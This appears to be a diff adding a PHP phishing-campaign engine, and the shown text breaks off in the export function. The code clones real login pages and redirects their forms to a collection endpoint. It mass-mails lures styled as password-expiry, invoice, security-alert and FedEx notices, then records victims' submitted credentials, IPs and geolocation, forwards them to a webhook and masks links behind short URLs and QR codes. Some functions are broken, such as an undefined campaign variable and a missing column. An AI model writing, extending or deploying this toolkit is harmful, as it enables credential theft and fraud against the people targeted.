@@ -1,0 +1,893 @@
+<?php
+/**
+ * COSMIC PHISHING CAMPAIGN ENGINE v5.0 – MASTER ENTERPRISE EDITION
+ * Fully integrated with Cosmic URL Masker, GeoIP, webhooks, QR codes,
+ * and advanced campaign management.
+ *
+ * @package    Cosmic\Phishing
+ * @version    5.0.0
+ */
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+class PhishingCampaign {
+    private $db;
+    private $campaignsDir;
+    private $dbPath;
+    private $config;
+    private $logger;
+    private $geoipReader = null;
+
+    public function __construct($config = []) {
+        $this->config = array_merge([
+            'data_dir'         => dirname(__DIR__, 2) . '/data/phishing/',
+            'public_dir'       => dirname(__DIR__, 2) . '/public/phishing/',
+            'smtp_host'        => '',
+            'smtp_port'        => 587,
+            'smtp_user'        => '',
+            'smtp_pass'        => '',
+            'smtp_encryption'  => 'tls',
+            'from_email'       => 'noreply@cosmic.local',
+            'from_name'        => 'COSMIC Phishing',
+            'enable_email'     => false,
+            'download_assets'  => false,
+            'max_asset_size'   => 5 * 1024 * 1024,
+            'enable_geoip'     => false,
+            'geoip_db'         => dirname(__DIR__, 2) . '/data/geoip/GeoLite2-City.mmdb',
+            'webhook_url'      => '',
+            'use_shortener'    => true,
+        ], $config);
+
+        $this->campaignsDir = rtrim($this->config['data_dir'], '/') . '/';
+        if (!is_dir($this->campaignsDir)) {
+            if (!mkdir($this->campaignsDir, 0755, true)) {
+                throw new RuntimeException("Cannot create campaigns directory: {$this->campaignsDir}");
+            }
+        }
+        $this->dbPath = $this->campaignsDir . 'campaigns.db';
+        $this->initLogger();
+        $this->initDB();
+        $this->initGeoIP();
+    }
+
+    private function initLogger() {
+        $logFile = $this->campaignsDir . 'campaigns.log';
+        $this->logger = function($level, $message, $context = []) use ($logFile) {
+            $entry = sprintf("[%s] %s: %s %s\n",
+                date('Y-m-d H:i:s'),
+                strtoupper($level),
+                $message,
+                json_encode($context)
+            );
+            file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
+        };
+    }
+
+    private function log($level, $message, $context = []) {
+        if ($this->logger) {
+            ($this->logger)($level, $message, $context);
+        }
+    }
+
+    private function initDB() {
+        if (!class_exists('SQLite3')) {
+            throw new RuntimeException("SQLite3 extension not loaded.");
+        }
+
+        try {
+            $this->db = new SQLite3($this->dbPath);
+            $this->db->busyTimeout(5000);
+            $this->db->exec('PRAGMA foreign_keys = ON;');
+            $this->db->exec('PRAGMA journal_mode = WAL;');
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                name TEXT UNIQUE,
+                target_url TEXT,
+                clone_path TEXT,
+                status TEXT DEFAULT 'draft',
+                created_at INTEGER,
+                launched_at INTEGER,
+                clicks INTEGER DEFAULT 0,
+                submissions INTEGER DEFAULT 0,
+                emails_sent INTEGER DEFAULT 0,
+                email_template TEXT,
+                smtp_config TEXT,
+                webhook_url TEXT DEFAULT ''
+            )");
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS targets (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                email TEXT,
+                name TEXT,
+                clicked INTEGER DEFAULT 0,
+                submitted INTEGER DEFAULT 0,
+                user_agent TEXT,
+                ip TEXT,
+                country TEXT,
+                city TEXT,
+                latitude REAL,
+                longitude REAL,
+                first_seen INTEGER,
+                last_seen INTEGER,
+                data TEXT
+            )");
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS emails (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                target_id INTEGER,
+                sent_at INTEGER,
+                opened INTEGER DEFAULT 0,
+                opened_at INTEGER
+            )");
+
+            $this->db->exec("CREATE TABLE IF NOT EXISTS links (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                code TEXT UNIQUE NOT NULL,
+                target_url TEXT NOT NULL,
+                campaign_id INTEGER,
+                created_at INTEGER,
+                clicks INTEGER DEFAULT 0,
+                last_clicked INTEGER,
+                password TEXT DEFAULT '',
+                expires_at INTEGER,
+                max_clicks INTEGER DEFAULT 0,
+                FOREIGN KEY(campaign_id) REFERENCES campaigns(id) ON DELETE CASCADE
+            )");
+
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_targets_campaign ON targets(campaign_id)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_targets_email ON targets(email)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_emails_campaign ON emails(campaign_id)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_emails_target ON emails(target_id)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_links_code ON links(code)");
+            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_links_campaign ON links(campaign_id)");
+
+            $this->migrate();
+
+        } catch (Exception $e) {
+            throw new RuntimeException("Database initialization failed: " . $e->getMessage());
+        }
+    }
+
+    private function initGeoIP() {
+        if ($this->config['enable_geoip'] && class_exists('GeoIp2\Database\Reader')) {
+            if (file_exists($this->config['geoip_db'])) {
+                try {
+                    $this->geoipReader = new GeoIp2\Database\Reader($this->config['geoip_db']);
+                } catch (Exception $e) {
+                    $this->log('WARNING', 'GeoIP init failed', ['error' => $e->getMessage()]);
+                }
+            }
+        }
+    }
+
+    private function migrate() {
+        $columns = $this->getTableColumns('campaigns');
+        if (!in_array('status', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN status TEXT DEFAULT 'draft'");
+        }
+        if (!in_array('launched_at', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN launched_at INTEGER");
+        }
+        if (!in_array('email_template', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN email_template TEXT");
+        }
+        if (!in_array('smtp_config', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN smtp_config TEXT");
+        }
+        if (!in_array('webhook_url', $columns)) {
+            $this->db->exec("ALTER TABLE campaigns ADD COLUMN webhook_url TEXT DEFAULT ''");
+        }
+
+        $columns = $this->getTableColumns('targets');
+        if (!in_array('data', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN data TEXT");
+        }
+        if (!in_array('first_seen', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN first_seen INTEGER");
+        }
+        if (!in_array('last_seen', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN last_seen INTEGER");
+        }
+        if (!in_array('country', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN country TEXT");
+        }
+        if (!in_array('city', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN city TEXT");
+        }
+        if (!in_array('latitude', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN latitude REAL");
+        }
+        if (!in_array('longitude', $columns)) {
+            $this->db->exec("ALTER TABLE targets ADD COLUMN longitude REAL");
+        }
+
+        $columns = $this->getTableColumns('emails');
+        if (!in_array('opened', $columns)) {
+            $this->db->exec("ALTER TABLE emails ADD COLUMN opened INTEGER DEFAULT 0");
+        }
+        if (!in_array('opened_at', $columns)) {
+            $this->db->exec("ALTER TABLE emails ADD COLUMN opened_at INTEGER");
+        }
+    }
+
+    private function getTableColumns($table) {
+        $result = $this->db->query("PRAGMA table_info($table)");
+        $columns = [];
+        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
+            $columns[] = $row['name'];
+        }
+        return $columns;
+    }
+
+    public function createCampaign($name, $targetUrl, $emailTemplate = '') {
+        if (!filter_var($targetUrl, FILTER_VALIDATE_URL)) {
+            throw new InvalidArgumentException("Invalid target URL.");
+        }
+        $stmt = $this->db->prepare("INSERT INTO campaigns (name, target_url, email_template, status, created_at) VALUES (:name, :url, :template, 'draft', :time)");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
+        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
+        $stmt->bindValue(':template', $emailTemplate, SQLITE3_TEXT);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        if (!$stmt->execute()) {
+            throw new RuntimeException("Failed to create campaign: " . $this->db->lastErrorMsg());
+        }
+        $this->log('INFO', 'Campaign created', ['name' => $name, 'id' => $this->db->lastInsertRowID()]);
+        return $this->db->lastInsertRowID();
+    }
+
+    public function updateCampaignStatus($campaignId, $status) {
+        $allowed = ['draft', 'active', 'paused', 'completed'];
+        if (!in_array($status, $allowed)) {
+            throw new InvalidArgumentException("Invalid status");
+        }
+        $stmt = $this->db->prepare("UPDATE campaigns SET status = :status WHERE id = :id");
+        if (!$stmt) return false;
+        $stmt->bindValue(':status', $status, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        return $stmt->execute() ? true : false;
+    }
+
+    public function clonePage($campaignId, $url = null) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) {
+            throw new InvalidArgumentException("Campaign not found.");
+        }
+        $url = $url ?: $campaign['target_url'];
+
+        $html = $this->fetchUrl($url);
+        if ($html === false) {
+            throw new RuntimeException("Failed to fetch URL: $url");
+        }
+
+        $dom = new DOMDocument();
+        libxml_use_internal_errors(true);
+        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
+        libxml_clear_errors();
+
+        $forms = $dom->getElementsByTagName('form');
+        foreach ($forms as $form) {
+            $form->setAttribute('action', '/phishing/collect?campaign=' . $campaignId);
+            $form->setAttribute('method', 'post');
+        }
+
+        if ($this->config['download_assets']) {
+            $this->embedAssets($dom, $url);
+        }
+
+        $html = $dom->saveHTML();
+
+        $publicBase = rtrim($this->config['public_dir'], '/') . '/pages/';
+        if (!is_dir($publicBase)) {
+            if (!mkdir($publicBase, 0755, true)) {
+                throw new RuntimeException("Failed to create public pages directory: $publicBase");
+            }
+        }
+
+        $cloneDir = $publicBase . preg_replace('/[^a-z0-9_-]/i', '_', $campaign['name']) . '/';
+        if (!is_dir($cloneDir) && !mkdir($cloneDir, 0755, true)) {
+            throw new RuntimeException("Failed to create clone directory: $cloneDir");
+        }
+        $clonePath = $cloneDir . 'index.html';
+        if (file_put_contents($clonePath, $html) === false) {
+            throw new RuntimeException("Failed to write clone file: $clonePath");
+        }
+
+        $publicPath = '/phishing/pages/' . basename($cloneDir) . '/';
+
+        $stmt = $this->db->prepare("UPDATE campaigns SET clone_path = :path, target_url = :url WHERE id = :id");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
+        $stmt->bindValue(':url', $url, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        $stmt->execute();
+
+        $this->log('INFO', 'Page cloned', ['campaign_id' => $campaignId, 'path' => $publicPath]);
+        return $publicPath;
+    }
+
+    private function fetchUrl($url) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            CURLOPT_HEADER => false,
+            CURLOPT_ENCODING => '',
+            CURLOPT_HTTPHEADER => [
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.5',
+                'Cache-Control: no-cache',
+                'Pragma: no-cache',
+                'DNT: 1',
+            ],
+        ]);
+
+        $html = curl_exec($ch);
+        $error = curl_error($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($html === false || $httpCode >= 400) {
+            $this->log('ERROR', 'cURL fetch failed', ['error' => $error, 'http_code' => $httpCode]);
+            return false;
+        }
+        return $html;
+    }
+
+    private function embedAssets($dom, $baseUrl) {
+        $baseParts = parse_url($baseUrl);
+        $baseScheme = $baseParts['scheme'] ?? 'http';
+        $baseHost = $baseParts['host'] ?? '';
+
+        // Process CSS links
+        $links = $dom->getElementsByTagName('link');
+        foreach ($links as $link) {
+            $rel = $link->getAttribute('rel');
+            if (strtolower($rel) === 'stylesheet') {
+                $href = $link->getAttribute('href');
+                if (!$href) continue;
+                $cssUrl = $this->resolveUrl($href, $baseScheme, $baseHost, $baseUrl);
+                if ($cssUrl) {
+                    $cssContent = $this->fetchUrl($cssUrl);
+                    if ($cssContent) {
+                        $cssContent = $this->embedCssAssets($cssContent, $cssUrl, $baseScheme, $baseHost);
+                        $style = $dom->createElement('style', $cssContent);
+                        $link->parentNode->replaceChild($style, $link);
+                    }
+                }
+            }
+        }
+
+        // Process images
+        $images = $dom->getElementsByTagName('img');
+        foreach ($images as $img) {
+            $src = $img->getAttribute('src');
+            if (!$src) continue;
+            $imgUrl = $this->resolveUrl($src, $baseScheme, $baseHost, $baseUrl);
+            if ($imgUrl) {
+                $imgData = $this->fetchUrl($imgUrl);
+                if ($imgData && strlen($imgData) < $this->config['max_asset_size']) {
+                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
+                    $mime = finfo_buffer($finfo, $imgData);
+                    finfo_close($finfo);
+                    $dataUri = 'data:' . $mime . ';base64,' . base64_encode($imgData);
+                    $img->setAttribute('src', $dataUri);
+                }
+            }
+        }
+    }
+
+    private function embedCssAssets($css, $cssUrl, $scheme, $host) {
+        return preg_replace_callback('/url\([\'"]?([^\'")]+)[\'"]?\)/', function($m) use ($cssUrl, $scheme, $host) {
+            $assetUrl = $this->resolveUrl($m[1], $scheme, $host, $cssUrl);
+            if (!$assetUrl) return $m[0];
+            $data = $this->fetchUrl($assetUrl);
+            if (!$data || strlen($data) >= $this->config['max_asset_size']) return $m[0];
+            $finfo = finfo_open(FILEINFO_MIME_TYPE);
+            $mime = finfo_buffer($finfo, $data);
+            finfo_close($finfo);
+            $dataUri = 'data:' . $mime . ';base64,' . base64_encode($data);
+            return 'url("' . $dataUri . '")';
+        }, $css);
+    }
+
+    private function resolveUrl($url, $scheme, $host, $baseUrl) {
+        if (preg_match('/^https?:\/\//i', $url)) return $url;
+        if (substr($url, 0, 2) === '//') return $scheme . ':' . $url;
+        if (substr($url, 0, 1) === '/') return $scheme . '://' . $host . $url;
+        $basePath = preg_replace('/\/[^\/]*$/', '/', $baseUrl);
+        return $basePath . $url;
+    }
+
+    public function importTargets($campaignId, $targets) {
+        $count = 0;
+        $stmt = $this->db->prepare("INSERT OR IGNORE INTO targets (campaign_id, email, name) VALUES (:cid, :email, :name)");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        foreach ($targets as $t) {
+            if (!filter_var($t['email'], FILTER_VALIDATE_EMAIL)) {
+                continue;
+            }
+            $stmt->clear();
+            $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+            $stmt->bindValue(':email', $t['email'], SQLITE3_TEXT);
+            $stmt->bindValue(':name', $t['name'] ?? '', SQLITE3_TEXT);
+            if ($stmt->execute()) {
+                $count++;
+            }
+        }
+        $this->log('INFO', 'Targets imported', ['campaign_id' => $campaignId, 'count' => $count]);
+        return $count;
+    }
+
+    public function generateEmailTemplate($type, $campaignName, $phishingLink) {
+        $templates = [
+            'password_reset' => "Subject: Password Expiry Notice\n\nDear {name},\n\nYour password for {campaign} will expire in 24 hours. Please reset it immediately: {link}\n\nIT Support",
+            'invoice' => "Subject: Invoice #{rand}\n\nDear {name},\n\nPlease find attached invoice #{rand}. Click to view: {link}\n\nFinance Dept",
+            'security_alert' => "Subject: Security Alert\n\nDear {name},\n\nWe detected unusual activity on your account. Verify now: {link}\n\nSecurity Team",
+            'newsletter' => "Subject: Exclusive Offer\n\nHi {name},\n\nCheck out our latest news: {link}\n\nMarketing",
+            'fedex' => "Subject: Package Delivery\n\nDear {name},\n\nYour package is waiting. Schedule delivery: {link}\n\nFedEx"
+        ];
+        $template = $templates[$type] ?? $templates['security_alert'];
+        $template = str_replace('{campaign}', $campaignName, $template);
+        $template = str_replace('{link}', $phishingLink, $template);
+        $template = str_replace('{rand}', rand(1000,9999), $template);
+        return $template;
+    }
+
+    public function updateEmailTemplate($campaignId, $template) {
+        $stmt = $this->db->prepare("UPDATE campaigns SET email_template = :tmpl WHERE id = :id");
+        if (!$stmt) {
+            error_log("Failed to prepare updateEmailTemplate: " . $this->db->lastErrorMsg());
+            return false;
+        }
+        $stmt->bindValue(':tmpl', $template, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        return $stmt->execute() ? true : false;
+    }
+
+    public function sendEmails($campaignId, $smtpConfig = null) {
+        if (!$this->config['enable_email']) {
+            $this->log('INFO', 'Email sending disabled', ['campaign_id' => $campaignId]);
+            return 0;
+        }
+
+        $targets = $this->getTargets($campaignId);
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) {
+            throw new InvalidArgumentException("Campaign not found.");
+        }
+
+        $linkBase = $this->getBaseUrl() . $campaign['clone_path'];
+        $sent = 0;
+        $mailer = $this->getMailer($smtpConfig ?: $this->config);
+
+        foreach ($targets as $target) {
+            $trackingLink = $linkBase . '?email=' . urlencode($target['email']);
+            $emailBody = str_replace(['{name}', '{link}'], [$target['name'], $trackingLink], $campaign['email_template']);
+            $subject = $this->extractSubject($emailBody);
+            $body = preg_replace('/^Subject:.*\n\n?/', '', $emailBody);
+
+            try {
+                $mailer->clearAddresses();
+                $mailer->addAddress($target['email'], $target['name']);
+                $mailer->Subject = $subject;
+                $mailer->Body = $body;
+                $mailer->send();
+
+                $stmt = $this->db->prepare("INSERT INTO emails (campaign_id, target_id, sent_at) VALUES (:cid, :tid, :time)");
+                if (!$stmt) continue;
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
+                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+                $stmt->execute();
+                $sent++;
+            } catch (Exception $e) {
+                $this->log('ERROR', 'Failed to send email', ['target' => $target['email'], 'error' => $e->getMessage()]);
+            }
+        }
+
+        $stmt = $this->db->prepare("UPDATE campaigns SET emails_sent = emails_sent + :sent, launched_at = :time WHERE id = :id");
+        if ($stmt) {
+            $stmt->bindValue(':sent', $sent, SQLITE3_INTEGER);
+            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+            $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+            $stmt->execute();
+        }
+
+        $this->log('INFO', 'Emails sent', ['campaign_id' => $campaignId, 'sent' => $sent]);
+        return $sent;
+    }
+
+    private function getBaseUrl() {
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+        return $protocol . '://' . $host;
+    }
+
+    private function getMailer($config) {
+        $mail = new PHPMailer(true);
+        try {
+            $mail->isSMTP();
+            $mail->Host       = $config['smtp_host'];
+            $mail->SMTPAuth   = true;
+            $mail->Username   = $config['smtp_user'];
+            $mail->Password   = $config['smtp_pass'];
+            $mail->SMTPSecure = $config['smtp_encryption'];
+            $mail->Port       = $config['smtp_port'];
+            $mail->setFrom($config['from_email'], $config['from_name']);
+            $mail->isHTML(false);
+            $mail->CharSet = 'UTF-8';
+        } catch (Exception $e) {
+            throw new RuntimeException("SMTP configuration error: " . $e->getMessage());
+        }
+        return $mail;
+    }
+
+    private function extractSubject($body) {
+        if (preg_match('/^Subject:\s*(.+)$/m', $body, $matches)) {
+            return trim($matches[1]);
+        }
+        return 'No Subject';
+    }
+
+    public function logClick($campaignId, $targetEmail, $ip, $ua) {
+        $target = $this->getTargetByEmail($campaignId, $targetEmail);
+        if ($target) {
+            $geo = $this->getGeoIP($ip);
+            $stmt = $this->db->prepare("UPDATE targets SET clicked = 1, ip = :ip, user_agent = :ua, country = :country, city = :city, latitude = :lat, longitude = :lon, first_seen = :time WHERE id = :tid");
+            if ($stmt) {
+                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
+                $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
+                $stmt->bindValue(':country', $geo['country'] ?? '', SQLITE3_TEXT);
+                $stmt->bindValue(':city', $geo['city'] ?? '', SQLITE3_TEXT);
+                $stmt->bindValue(':lat', $geo['latitude'] ?? 0, SQLITE3_FLOAT);
+                $stmt->bindValue(':lon', $geo['longitude'] ?? 0, SQLITE3_FLOAT);
+                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+
+            $stmt = $this->db->prepare("UPDATE campaigns SET clicks = clicks + 1 WHERE id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+        }
+    }
+
+    public function logSubmission($campaignId, $targetEmail, $data) {
+        $target = $this->getTargetByEmail($campaignId, $targetEmail);
+        if ($target) {
+            $geo = $this->getGeoIP($_SERVER['REMOTE_ADDR'] ?? '');
+            $stmt = $this->db->prepare("UPDATE targets SET submitted = 1, data = :data, ip = :ip, user_agent = :ua, country = :country, city = :city, latitude = :lat, longitude = :lon, last_seen = :time WHERE id = :tid");
+            if ($stmt) {
+                $stmt->bindValue(':data', json_encode($data), SQLITE3_TEXT);
+                $stmt->bindValue(':ip', $_SERVER['REMOTE_ADDR'] ?? '', SQLITE3_TEXT);
+                $stmt->bindValue(':ua', $_SERVER['HTTP_USER_AGENT'] ?? '', SQLITE3_TEXT);
+                $stmt->bindValue(':country', $geo['country'] ?? '', SQLITE3_TEXT);
+                $stmt->bindValue(':city', $geo['city'] ?? '', SQLITE3_TEXT);
+                $stmt->bindValue(':lat', $geo['latitude'] ?? 0, SQLITE3_FLOAT);
+                $stmt->bindValue(':lon', $geo['longitude'] ?? 0, SQLITE3_FLOAT);
+                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+
+            $stmt = $this->db->prepare("UPDATE campaigns SET submissions = submissions + 1 WHERE id = :cid");
+            if ($stmt) {
+                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+                $stmt->execute();
+            }
+
+            if (!empty($campaign['webhook_url'])) {
+                $this->fireWebhook($campaignId, $targetEmail, $data);
+            }
+        }
+    }
+
+    private function fireWebhook($campaignId, $targetEmail, $data) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign || empty($campaign['webhook_url'])) return;
+
+        $payload = json_encode([
+            'event'        => 'submission',
+            'campaign_id'  => $campaignId,
+            'campaign_name'=> $campaign['name'],
+            'target_email' => $targetEmail,
+            'data'         => $data,
+            'ip'           => $_SERVER['REMOTE_ADDR'] ?? '',
+            'user_agent'   => $_SERVER['HTTP_USER_AGENT'] ?? '',
+            'time'         => time(),
+        ]);
+
+        $ch = curl_init($campaign['webhook_url']);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+
+    private function getTargetByEmail($campaignId, $email) {
+        $stmt = $this->db->prepare("SELECT id FROM targets WHERE campaign_id = :cid AND email = :email");
+        if (!$stmt) return null;
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':email', $email, SQLITE3_TEXT);
+        $res = $stmt->execute();
+        return $res->fetchArray(SQLITE3_ASSOC);
+    }
+
+    private function getGeoIP($ip) {
+        if (!$this->geoipReader || $ip === '127.0.0.1' || $ip === '::1') {
+            return ['country' => 'Local', 'city' => 'Localhost'];
+        }
+        try {
+            $record = $this->geoipReader->city($ip);
+            return [
+                'country'   => $record->country->name,
+                'city'      => $record->city->name,
+                'latitude'  => $record->location->latitude,
+                'longitude' => $record->location->longitude,
+            ];
+        } catch (Exception $e) {
+            return ['country' => 'Unknown', 'city' => 'Unknown'];
+        }
+    }
+
+    public function createShortLink($campaignId, $targetUrl = null, $customCode = null, $expiresIn = 0, $maxClicks = 0, $password = '') {
+        if ($targetUrl === null) {
+            $campaign = $this->getCampaign($campaignId);
+            if (!$campaign) {
+                throw new InvalidArgumentException("Campaign not found");
+            }
+            $targetUrl = $this->getBaseUrl() . $campaign['clone_path'];
+        }
+
+        if ($this->config['use_shortener'] && file_exists(dirname(__DIR__) . '/CosmicUrlMasker.php')) {
+            require_once dirname(__DIR__) . '/CosmicUrlMasker.php';
+            $shortener = new CosmicUrlMasker();
+            $result = $shortener->createShortLink($targetUrl, $customCode, $expiresIn, $campaignId, null, $password);
+            return $result['short_url'];
+        }
+
+        do {
+            $code = $this->generateCode(6);
+            $exists = $this->db->querySingle("SELECT 1 FROM links WHERE code = '$code'");
+        } while ($exists);
+
+        $stmt = $this->db->prepare("INSERT INTO links (code, target_url, campaign_id, created_at, expires_at, max_clicks, password) VALUES (:code, :url, :cid, :time, :expires, :max, :pass)");
+        if (!$stmt) {
+            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
+        }
+        $stmt->bindValue(':code', $code, SQLITE3_TEXT);
+        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->bindValue(':expires', $expiresIn ? time() + $expiresIn : null, SQLITE3_INTEGER);
+        $stmt->bindValue(':max', $maxClicks, SQLITE3_INTEGER);
+        $stmt->bindValue(':pass', $password, SQLITE3_TEXT);
+        $stmt->execute();
+
+        return $this->getBaseUrl() . '/l/' . $code;
+    }
+
+    public function generateQRCode($code, $size = 150) {
+        $shortUrl = $this->getBaseUrl() . '/l/' . $code;
+        return 'https://api.qrserver.com/v1/create-qr-code/?size=' . $size . 'x' . $size . '&data=' . urlencode($shortUrl);
+    }
+
+    private function generateCode($length = 6) {
+        $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        $max = strlen($chars) - 1;
+        $code = '';
+        for ($i = 0; $i < $length; $i++) {
+            $code .= $chars[random_int(0, $max)];
+        }
+        return $code;
+    }
+
+    public function getCampaign($id) {
+        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = :id");
+        if (!$stmt) return null;
+        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        return $res->fetchArray(SQLITE3_ASSOC);
+    }
+
+    public function getCampaigns() {
+        $res = $this->db->query("SELECT * FROM campaigns ORDER BY created_at DESC");
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
+        return $out;
+    }
+
+    public function getTargets($campaignId, $limit = 1000, $offset = 0) {
+        $stmt = $this->db->prepare("SELECT * FROM targets WHERE campaign_id = :cid ORDER BY id LIMIT :limit OFFSET :offset");
+        if (!$stmt) return [];
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
+        $stmt->bindValue(':offset', $offset, SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
+        return $out;
+    }
+
+    public function getStats($campaignId) {
+        $campaign = $this->getCampaign($campaignId);
+        if (!$campaign) return null;
+
+        $stmt = $this->db->prepare("SELECT COUNT(*) FROM targets WHERE campaign_id = :cid");
+        if (!$stmt) return null;
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $total = $stmt->execute()->fetchArray(SQLITE3_NUM)[0];
+
+        return [
+            'campaign' => $campaign,
+            'targets_total' => $total,
+            'clicks' => $campaign['clicks'],
+            'submissions' => $campaign['submissions'],
+            'emails_sent' => $campaign['emails_sent']
+        ];
+    }
+
+    public function getClicksPerDay($campaignId, $days = 30) {
+        $stmt = $this->db->prepare("
+            SELECT date(clicked_at, 'unixepoch') as day, COUNT(*) as count
+            FROM targets
+            WHERE campaign_id = :cid AND clicked = 1 AND clicked_at > :since
+            GROUP BY day
+            ORDER BY day
+        ");
+        if (!$stmt) return [];
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':since', time() - ($days * 86400), SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
+        return $out;
+    }
+
+    public function exportResults($campaignId, $format = 'csv') {
+        $targets = $this->getTargets($campaignId, 100000);
+        if ($format === 'csv') {
+            $output = fopen('php://temp', 'w');
+            fputcsv($output, ['Email', 'Name', 'Clicked', 'Submitted', 'IP', 'Country', 'City', 'User Agent', 'First Seen', 'Last Seen', 'Data']);
+            foreach ($targets as $t) {
+                fputcsv($output, [
+                    $t['email'],
+                    $t['name'],
+                    $t['clicked'],
+                    $t['submitted'],
+                    $t['ip'],
+                    $t['country'],
+                    $t['city'],
+                    $t['user_agent'],
+                    $t['first_seen'] ? date('Y-m-d H:i:s', $t['first_seen']) : '',
